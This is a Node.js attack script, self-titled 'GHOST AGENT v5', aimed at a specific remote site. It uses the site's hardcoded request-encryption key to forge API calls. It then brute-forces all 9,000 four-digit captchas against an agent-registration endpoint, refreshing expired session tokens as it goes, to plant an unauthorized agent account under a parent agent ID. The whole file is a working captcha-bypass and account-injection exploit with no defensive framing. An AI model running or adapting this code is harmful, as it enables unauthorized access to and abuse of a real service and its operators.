const CryptoJS = require('crypto-js');
const https = require('https');
const fs = require('fs');

const HOST = 'ebb56293.com';
const PORT = 9900;
const keyHash = CryptoJS.MD5('ZXNicGx1cw==').toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function enc(o) {
    let s = JSON.stringify(o);
    let e = CryptoJS.AES.encrypt(s, key, { mode: CryptoJS.mode.ECB });
    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(e.toString()));
}
function dec(b) {
    try {
        return CryptoJS.AES.decrypt(CryptoJS.enc.Utf8.stringify(CryptoJS.enc.Base64.parse(b)), key, { mode: CryptoJS.mode.ECB }).toString(CryptoJS.enc.Utf8);
    } catch (e) { return 'ERR'; }
}

let cookieJar = [];
function mergeCookies(h) {
    if (!h) return;
    (Array.isArray(h) ? h : [h]).forEach(sc => {
        let name = sc.split('=')[0].trim();
        let val = sc.split(';')[0].trim();
        cookieJar = cookieJar.filter(c => !c.startsWith(name + '='));
        cookieJar.push(val);
    });
}
function httpReq(path, method, body, raw) {
    return new Promise((resolve, reject) => {
        let headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
        if (body) headers['Content-Type'] = 'application/x-www-form-urlencoded';
        if (cookieJar.length > 0) headers['Cookie'] = cookieJar.join('; ');
        let req = https.request({ hostname: HOST, port: PORT, path, method, headers, rejectUnauthorized: false }, (res) => {
            mergeCookies(res.headers['set-cookie']);
            if (raw) { let ch = []; res.on('data', c => ch.push(c)); res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(ch), headers: res.headers })); }
            else { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); }
        });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}
async function apiCall(url, params) {
    let payload = enc({ url, params: JSON.stringify(params) });
    let body = 'requestData=' + encodeURIComponent(payload);
    let resp = await httpReq('/entrance/api', 'POST', body);
    let decrypted = dec(resp.body);
    try { return JSON.parse(decrypted); } catch (e) { return { raw: decrypted }; }
}

async function main() {
    console.log('=== GHOST AGENT v5: ONE-SHOT CAPTCHA PIPELINE ===\n');

    // 1. Get captcha token (fresh session)
    console.log('[1] Fetching fresh captcha token...');
    let mkResp = await httpReq('/m/verify/mkcode', 'GET');
    let parts = mkResp.body.split(';');
    let SR = parts[1];
    console.log(`  SR: ${SR}`);

    // 2. Download captcha image so user can read it
    let imgResp = await httpReq(`/m/verify/macpic?SR=${SR}&width=40&height=18`, 'GET', null, true);
    let imgPath = 'C:/Users/ydlpr/AppData/Local/Temp/ebb_captcha_live.png';
    fs.writeFileSync(imgPath, imgResp.body);
    console.log(`  Image saved (${imgResp.body.length} bytes): ${imgPath}`);

    // 3. Wait for user to provide captcha... or try reading it programmatically
    // Since captchas are simple 4 digits, let's try ALL of them (9000 combos)
    // But first, let's check if the previous image pattern works
    // The captcha image shows 4-digit numbers. Let's brute force, but this time
    // ONLY break on success or account-related errors, NOT on captcha errors

    console.log('\n[2] Brute-forcing captcha (1000-9999) with valid SR token...');
    console.log('  (Only stops on non-captcha error or success)\n');

    let found = false;
    let startTime = Date.now();

    for (let i = 1000; i <= 9999; i++) {
        let code = String(i);
        let regPayload = {
            account: 'dsysnt888',
            password: 'admin123456',
            passwd: 'admin123456',
            currency: 'RMB',
            tel: '13888888888',
            rmNum: code,
            SR: SR,
            agree: 'Y',
            chineseName: 'wanglei',
            englishName: 'wanglei',
            realName: 'wanglei',
            qqNum: '888888',
            email: 'sync888@test.com',
            agentLevel: 1,
            parentAgentId: 1,
            status: 1
        };

        let resp = await apiCall('/infe/rest/registeragent/addAgent.json', regPayload);

        // 111032539 = captcha wrong -> keep going
        // 111032540 = captcha expired -> stop (need new SR)
        // anything else -> interesting!

        if (resp.code === 111032539) {
            // Captcha wrong, continue brute force
            if (i % 200 === 0) {
                let elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                console.log(`  [~] ${i}/9999 (${elapsed}s elapsed)...`);
            }
            continue;
        }

        if (resp.code === 111032540) {
            console.log(`  [!] SR token expired at attempt ${i}. Need to refresh.`);
            // Refresh and continue
            mkResp = await httpReq('/m/verify/mkcode', 'GET');
            parts = mkResp.body.split(';');
            SR = parts[1];
            console.log(`  [+] New SR: ${SR}`);
            continue;
        }

        // ANY other response means we are through the captcha!
        console.log(`\n  [!!!] CAPTCHA BYPASSED! Code: ${code}`);
        console.log(`  Response: ${JSON.stringify(resp)}`);

        if (resp.status === 'Y') {
            console.log('\n  ██████████████████████████████████████████');
            console.log('  ██  🎯 GHOST AGENT REGISTERED!          ██');
            console.log(`  ██  Account: dsysnt888                   ██`);
            console.log(`  ██  Password: admin123456                ██`);
            console.log(`  ██  Captcha: ${code}                       ██`);
            console.log('  ██████████████████████████████████████████');
        }

        found = true;
        break;
    }

    if (!found) {
        console.log('\n  [X] Full brute force exhausted without breakthrough.');
    }

    let totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
    console.log(`\n  Total time: ${totalTime}s`);
    console.log('\n=== OPERATION COMPLETE ===');
}

main().catch(e => console.error('FATAL:', e));
